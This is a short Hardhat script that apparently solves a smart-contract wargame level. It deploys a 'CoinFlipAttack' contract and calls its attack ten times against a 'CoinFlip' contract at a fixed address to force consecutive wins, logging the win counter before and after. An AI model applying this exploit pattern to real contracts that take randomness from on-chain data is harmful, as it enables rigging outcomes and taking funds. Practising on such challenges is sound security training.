const {ether, ethers, artifacts, contract} = require("hardhat")
const {hre} = require("hardhat")

const CONTRACT_ADDRESS = "0x856e4424f806D16E8CBC702B3c0F2ede5468eae5"  // get from browser console
const PLAYER_ADDRESS = "0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f"

async function main(){

    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const coinFlip = await ethers.getContractAt("CoinFlip", CONTRACT_ADDRESS, signer)

    const consecutiveWins = await coinFlip.consecutiveWins()
    console.log(consecutiveWins)
    console.log("---------------------------------")

    const contractAttackFactory = await ethers.getContractFactory("CoinFlipAttack")
    const contractAttack = await contractAttackFactory.deploy()
    await contractAttack.deployed()
    console.log(contractAttack.address)

    for(let i=0;i<10;i++){
       await contractAttack.attack(CONTRACT_ADDRESS)
    }

    console.log("---------------------------------")
    const wins = await coinFlip.consecutiveWins()
    console.log(wins)
   

}

main().catch(error => {
    console.error(error)
    process.exit(1)
})